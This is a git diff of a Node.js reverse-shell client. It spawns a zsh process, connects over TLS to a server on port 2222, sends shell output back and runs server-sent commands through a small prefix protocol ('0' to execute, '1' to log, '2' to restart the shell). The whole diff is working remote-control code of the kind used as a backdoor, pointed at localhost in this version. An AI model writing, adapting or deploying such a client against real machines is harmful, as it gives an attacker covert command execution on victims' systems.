@@ -21,10 +21,10 @@ let reconnect = false;
  */
 const serverConnect = () => {
     
-    shell = child.spawn("zsh", []); //cmd.exe
+    shell = child.spawn("zsh", []); //cmd.exe , zsh
 
     const client = tls.connect(2222,'127.0.0.1', options, () => {
-        client.pipe(shell.stdin);
+        // client.pipe(shell.stdin);
         shell.stdout.pipe(client);
         shell.stderr.pipe(client);
     })
@@ -35,33 +35,35 @@ const serverConnect = () => {
         console.log('Connected!')
     })
 
+    // client.on('data', (data) => {
+    //     msg = data.toString()
+
+
+    //     shell.stdin.write(msg)
+    // })
+
     /**
      * Data from server is broken up into few parts:
      * if the first character is 0 : execute as a shell command
      * if the first character is 1 : write to console 
+     * if the first character is 2 : reset the shell child process
      */
-    // client.on('data', (data) => {
-    //     msg = data.toString()
+    client.on('data', (data) => {
+        msg = data.toString()
     
-    //     switch (msg[0]) {
-    //         case '0':
-    //             exec(msg.substr(1), (err, stdout, stderr) => {
-    //                 if (err) {
-    //                     client.write(`error: ${err.message}`);
-    //                     return;
-    //                 }
-    //                 if (stderr) {
-    //                     client.write(`stderr: ${stderr}`);
-    //                     return;
-    //                 }
-    //                 client.write(stdout);
-    //             })
-    //             break
-    //         case '1':
-    //             console.log('Server: ' + msg.substr(1))
-    //             break
-    //     }
-    // })
+        switch (msg[0]) {
+            case '0':
+                shell.stdin.write(msg.substr(1))
+                break
+            case '1':
+                console.log('Server: ' + msg.substr(1))
+                break
+            case '2':
+                shell.kill()
+                shell = child.spawn("zsh", []);
+                break
+        }
+    })
     
     // if the socket disconnects, destroy the socket, and attempt to reconnect with a new socket
     client.on('close', () => {
